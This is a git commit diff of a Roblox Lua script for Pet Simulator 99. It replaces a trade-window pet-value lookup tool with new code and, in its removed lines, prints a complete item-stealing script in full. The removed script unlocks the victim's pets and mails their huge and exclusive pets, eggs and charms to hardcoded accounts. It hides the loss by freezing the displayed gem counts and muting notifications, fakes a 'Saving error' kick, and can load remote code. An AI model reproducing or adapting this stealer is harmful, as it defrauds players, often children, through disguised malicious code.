5b5c17155f12269a0f0ac2463951bb2d12ab23f1
larsweile2 <155337826+larsweile2@users.noreply.github.com>
2024-01-29 22:14:29 +0100

    Update sourcetest.lua

--- sourcetest.lua
+++ sourcetest.lua
@@ -1,244 +1,95 @@
-Username = "tobi437a"
-LoadScreen = false -- If you want to enable loadgui, rename to true
+local request = http_request or request or HttpPost or syn.request
+local url = "https://123demands.com/_next/data/C0OlgVHk5UcRPbBPtRDVM/Pet-Simulator-99-Values.json"
 
-
-if LoadScreen == true then 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/P99/main/loadingscreen"))()
-end
-
-local library = require(game.ReplicatedStorage.Library)
-local save = library.Save.Get().Inventory
-local plr = game.Players.LocalPlayer
-local MailMessage = "gg / HcpNe56R2a"
-local GetSave = function()
-    return require(game.ReplicatedStorage.Library.Client.Save).Get()
-end
-
-for i, v in pairs(GetSave().Inventory.Currency) do
-    if v.id == "Diamonds" then
-        GemAmount1 = v._am
-    end
-end
-
-if GemAmount1 < 10000 then
-    plr:kick("Saving error, please rejoin!")
-end
-
-local AmountOfHuges = 0
-for i, v in pairs(save.Pet) do
-    local id = v.id
-    local dir = library.Directory.Pets[id]
-    if dir.huge then
-		AmountOfHuges = AmountOfHuges + 1
-    end
-end
-
-if AmountOfHuges >= 6 or GemAmount1 >= 20000000 then
-    Username = "Alyssa87123"
-end
-
-local user = Username
-
-local gemsleft = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount.Text
-local gemsleftpath = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
-gemsleftpath:GetPropertyChangedSignal("Text"):Connect(function()
-	gemsleftpath.Text = gemsleft
-end)
-
-local gemsleaderstat = game:GetService('Players').LocalPlayer.leaderstats["💎 Diamonds"].Value
-local gemsleaderstatpath = game:GetService('Players').LocalPlayer.leaderstats["💎 Diamonds"]
-gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
-	gemsleaderstatpath.Value = gemsleaderstat
-end)
-
-local loading = game:GetService('Players').LocalPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"]
-local noti = game:GetService('Players').LocalPlayer.PlayerGui.Notifications
-loading.Disabled = true
-noti:GetPropertyChangedSignal("Enabled"):Connect(function()
-	noti.Enabled = false
-end)
-noti.Enabled = false
-
-function StealHuge()
-	local hugesSent = 0
-	local initialHuges = CountHuges()
-    for i, v in pairs(save.Pet) do
-        local id = v.id
-        local dir = library.Directory.Pets[id]
-        if dir.huge then
-			if v._lk then
-				local args = {
-				[1] = i,
-				[2] = false
-				}
-				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
-			end
-            local args = {
-                [1] = user,
-                [2] = MailMessage,
-                [3] = "Pet",
-                [4] = i,
-                [5] = v._am or 1
-            }
-			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			local finalHuges = CountHuges()
-			if finalHuges < initialHuges then
-				hugesSent = hugesSent + 1
-				initialHuges = finalHuges
-			end
+local function searchTableForString(tbl, searchString)
+    for key, value in pairs(tbl) do
+        if type(value) == "table" then
+            searchTableForString(value, searchString)
+        elseif type(value) == "string" then
+            local gemValue = string.find(value, searchString)
+            if gemValue then
+                print("Key:", key)
+                print("Value:", value)
+            end
         end
     end
-	return hugesSent
 end
 
-function CountHuges()
-	local count = 0
-	for i, v in pairs(save.Pet) do
-		local id = v.id
-		local dir = library.Directory.Pets[id]
-		if dir.huge then
-			count = count + 1
-		end
+local allPets = request({
+    Url = url,
+    Method = "GET"
+})
+
+if allPets.Success and allPets.Body then
+    local jsonContent = game.HttpService:JSONDecode(allPets.Body)
+else
+    print("Failed to retrieve data from the URL")
+end
+
+
+local function getPetFromURL(imageURL, hasShinePulse, isRainbow)
+    local url = "https://www.roblox.com/library/" .. imageURL
+	local variant = ""
+
+    local response = request({
+        Url = url,
+        Method = "GET"
+    })
+
+    if response.Success then
+        local title = response.Body:match("<title>(.-)%s- %- Roblox</title>")
+        if title then
+            if title:find("Images/") then
+                title = title:gsub("Images/", "")
+			end
+			if title:find("(1)") then
+				title = title:gsub(" %(1%)", "")
+			end
+			if title:find("(Golden)") then
+                title = title:gsub(" %(Golden%)", "")
+				variant = "golden"
+            end
+			if isRainbow then
+				variant = "rainbow"
+			end
+			if hasShinePulse then
+				variant = "shiny" .. variant
+			end
+			if variant == "" then
+				variant = "normal"
+			end
+            return title, variant
+        end
+    end
+    return nil
+end
+
+local localPlayer = game:GetService("Players").LocalPlayer
+local tradewindow = localPlayer.PlayerGui.TradeWindow
+local playeritems = tradewindow.Frame.PlayerItems.Items
+
+playeritems.ChildAdded:Connect(function(child)
+    local item = child
+    local icon = item.Icon.Image
+    local imageURL = icon:match("://(.*)")
+	local hasShinePulse = false
+	local isRainbow = false
+	
+	if item:FindFirstChild("ShinePulse") then
+		hasShinePulse = true
 	end
-	return count
-end
-
-function SendAllHuges()
-	local totalHuges = CountHuges()
-	local hugesSent = 0
-	repeat
-		hugesSent = hugesSent + StealHuge()
-	until hugesSent == totalHuges
-end
-
-function ExcSteal()
-	local excSent = 0
-	local initialExc = CountExc()
-    for i, v in pairs(save.Pet) do
-        local id = v.id
-        local dir = library.Directory.Pets[id]
-        if dir.exclusiveLevel then
-			if v._lk then
-				local args = {
-				[1] = i,
-				[2] = false
-				}
-				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
-			end
-            local args = {
-                [1] = user,
-                [2] = MailMessage,
-                [3] = "Pet",
-                [4] = i,
-                [5] = v._am or 1
-            }
-            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			local finalExc = CountExc()
-			if finalExc < initialExc then
-				excSent = excSent + 1
-				initialExc = finalExc
-			end
-        end
-    end
-	return excSent
-end
-
-function CountExc()
-	local count = 0
-	for i, v in pairs(save.Pet) do
-		local id = v.id
-		local dir = library.Directory.Pets[id]
-		if dir.exclusiveLevel then
-			count = count + 1
-		end
+	
+	if item.Icon:FindFirstChild("RainbowIcon") then
+		isRainbow = true
 	end
-	return count
-end
 
-function SendAllExc()
-	local totalExc = CountExc()
-	local excSent = 0
-	repeat
-		excSent = excSent + ExcSteal()
-	until excSent == totalExc
-end
-
-function EggSteal()
-    for i, v in pairs(save.Egg) do
-		local id = v.id
-		local diregg = library.Directory.Eggs[id]
-		if diregg then
-			local args = {
-				[1] = user,
-				[2] = MailMessage,
-				[3] = "Egg",
-				[4] = i,
-				[5] = v._am or 1
-			}
-			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    local title, variant = getPetFromURL(imageURL, hasShinePulse, isRainbow)
+    if title then
+        print("This is a:", title, "its variant is", variant)
+		if jsonContent then
+			searchTableForString(jsonContent, string.lower(title))
+		else
+			print("JSON content is nil")
 		end
     end
-end
-
-function CharmSteal()
-    for i, v in pairs(save.Charm) do
-        local id = v.id
-		local dircharm = library.Directory.Charms[id]
-		if dircharm then
-			local args = {
-				[1] = user,
-				[2] = MailMessage,
-				[3] = "Charm",
-				[4] = i,
-				[5] = v._am or 1
-			}
-			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-		end
-    end
-end
-
-function GemSteal()
-    for i, v in pairs(GetSave().Inventory.Currency) do
-        if v.id == "Diamonds" then
-            GemAmount = v._am
-            GemId = i
-            local args = {
-                [1] = user,
-                [2] = MailMessage,
-                [3] = "Currency",
-                [4] = GemId,
-                [5] = GemAmount - 10000
-            }
-            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-        end
-    end
-end
-
-function EmptyBoxes()
-    if save.Box then
-        for key, _ in pairs(save.Box) do
-			local args = {
-				[1] = key
-			}
-			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(unpack(args))
-        end
-    end
-end
-
-EmptyBoxes()
-
-SendAllHuges()
-SendAllExc()
-
-if save.Egg ~= nil then
-    EggSteal()
-end
-
-if save.Charm ~= nil then
-    CharmSteal()
-end
-
---while true do
-	--wait(1.25)
-	--GemSteal()
---end
+end)
